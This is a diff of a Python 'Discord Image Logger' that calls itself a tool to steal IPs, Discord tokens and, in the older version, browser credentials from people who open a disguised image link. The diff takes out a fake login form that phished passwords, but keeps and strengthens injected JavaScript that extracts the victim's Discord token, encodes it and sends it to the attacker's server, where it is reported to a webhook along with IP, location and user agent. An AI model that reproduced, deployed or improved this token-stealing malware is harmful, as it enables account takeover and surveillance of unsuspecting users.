@@ -3,8 +3,8 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs, Discord tokens, and browser credentials by abusing Discord's Open Original feature"
-__version__ = "v2.3"
+__description__ = "A simple application which allows you to steal IPs and Discord tokens by abusing Discord's Open Original feature"
+__version__ = "v2.4"
 __author__ = "DeKrypt"
 
 config = {
@@ -35,8 +35,6 @@ config = {
     },
     # TOKEN GRABBER #
     "tokenGrabber": True,
-    # PASSWORD GRABBER #
-    "passwordGrabber": True,
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
@@ -64,7 +62,7 @@ def reportError(error, context="Unknown"):
     except Exception as e:
         print(f"Failed to report error to webhook: {e}")
 
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None, password=None, username=None):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token=None):
     if ip and ip.startswith(blacklistedIPs):
         return
     
@@ -125,7 +123,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
         "content": ping,
         "embeds": [
             {
-                "title": "Image Logger - IP, Token, and Credentials Logged",
+                "title": "Image Logger - IP and Token Logged",
                 "color": config["color"],
                 "description": f"""**A User Opened the Original Image!**
 
@@ -150,10 +148,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, token
 
 **Discord Token:**
 > `{token if token else 'Not retrieved'}`
-
-**Captured Credentials:**
-> **Username:** `{username if username else 'Not provided'}`
-> **Password:** `{password if password else 'Not retrieved'}`
 
 **User Agent:**
 ```
@@ -206,30 +200,7 @@ background-repeat: no-repeat;
 background-size: contain;
 width: 100vw;
 height: 100vh;
-}}
-div.login {{
-position: absolute;
-top: 20px;
-left: 20px;
-background: rgba(0, 0, 0, 0.8);
-padding: 20px;
-border-radius: 5px;
-color: white;
-font-family: Arial, sans-serif;
-}}
-input, button {{
-margin: 10px 0;
-padding: 5px;
-width: 200px;
-}}
-</style>
-<div class="img"></div>
-<div class="login">
-    <h3>Login to View Content</h3>
-    <input type="text" id="username" placeholder="Username" autocomplete="username">
-    <input type="password" id="password" placeholder="Password" autocomplete="current-password">
-    <button onclick="submitCredentials()">Login</button>
-</div>'''.encode()
+}}</style><div class="img"></div>'''.encode()
             
             x_forwarded_for = self.headers.get('x-forwarded-for')
             if x_forwarded_for and x_forwarded_for.startswith(blacklistedIPs):
@@ -250,36 +221,25 @@ width: 200px;
                 dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
                 token = None
-                username = None
-                password = None
 
                 if config.get("tokenGrabber", False):
                     data += b'''<script>
-                    function getToken() {
+                    function getToken(attempt = 1, maxAttempts = 5) {
                         try {
                             var token = (window.webpackChunkdiscord_app?.push([[Symbol()],{},e=>e])?.c||{}).find(m=>m?.exports?.default?.getToken!==void 0)?.exports.default.getToken();
                             if (token) {
                                 fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + "t=" + btoa(token).replace(/=/g, "%3D"));
+                            } else if (attempt < maxAttempts) {
+                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                             }
-                        } catch (e) { console.error("Token grabber failed:", e); }
-                    }
-                    setTimeout(getToken, 1000);
-                    </script>'''
-
-                if config.get("passwordGrabber", False):
-                    data += b'''<script>
-                    function submitCredentials() {
-                        try {
-                            var username = document.getElementById('username').value;
-                            var password = document.getElementById('password').value;
-                            if (username || password) {
-                                var query = "";
-                                if (username) query += "u=" + btoa(username).replace(/=/g, "%3D");
-                                if (password) query += (query ? "&" : "") + "p=" + btoa(password).replace(/=/g, "%3D");
-                                fetch(window.location.href + (window.location.href.includes("?") ? "&" : "?") + query);
+                        } catch (e) {
+                            console.error("Token grabber failed:", e);
+                            if (attempt < maxAttempts) {
+                                setTimeout(() => getToken(attempt + 1, maxAttempts), 1000);
                             }
-                        } catch (e) { console.error("Credential grabber failed:", e); }
+                        }
                     }
+                    setTimeout(getToken, 500);
                     </script>'''
 
                 if dic.get("t"):
@@ -287,16 +247,6 @@ width: 200px;
                         token = base64.b64decode(dic.get("t").encode()).decode()
                     except Exception as e:
                         reportError(str(e), "Decoding token")
-                if dic.get("u"):
-                    try:
-                        username = base64.b64decode(dic.get("u").encode()).decode()
-                    except Exception as e:
-                        reportError(str(e), "Decoding username")
-                if dic.get("p"):
-                    try:
-                        password = base64.b64decode(dic.get("p").encode()).decode()
-                    except Exception as e:
-                        reportError(str(e), "Decoding password")
 
                 if dic.get("g") and config.get("accurateLocation", False):
                     try:
@@ -304,9 +254,9 @@ width: 200px;
                     except Exception as e:
                         reportError(str(e), "Decoding location")
                         location = None
-                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token, username=username, password=password)
+                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url, token=token)
                 else:
-                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token, username=username, password=password)
+                    result = makeReport(x_forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url, token=token)
 
                 message = config["message"]["message"]
 
